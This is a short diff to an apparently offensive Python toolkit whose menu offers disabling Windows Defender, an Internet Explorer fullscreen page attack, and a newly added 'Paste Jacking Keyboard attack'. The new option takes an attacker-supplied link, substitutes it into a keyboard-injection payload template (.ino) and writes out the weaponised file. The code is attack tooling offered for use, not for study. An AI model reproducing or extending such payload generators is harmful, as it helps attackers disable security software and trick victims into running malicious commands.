@@ -4,7 +4,7 @@ def subbackdorringmenu():
     print ("""
         1 - Disable windows 7/8/10 Defender
         2 - Iexplorer Fullscreen page attack
-        3 - EDIT
+        3 - Paste Jacking Keyboard attack
         0 - Back to frist select menu
         """)
 
@@ -35,7 +35,15 @@ def subbackdorringmenu():
 
 
     elif submenuselect == "3":
-        print ("Edit ok")
+        jacksite = raw_input(str("Digite o link do Postjack: "))
+        f = open('payloads/PasteJackingattack.ino', 'r')
+        filedata = f.read()
+        f.close()
+        newdata = filedata.replace("JACKSITE", jacksite)
+        f = open('out/OUT-PasteJackingattack.ino', 'w')
+        f.write(newdata)
+        f.close()
+        os.system("start out/OUT-PasteJackingattack.ino")
 
 
     elif submenuselect == "0":
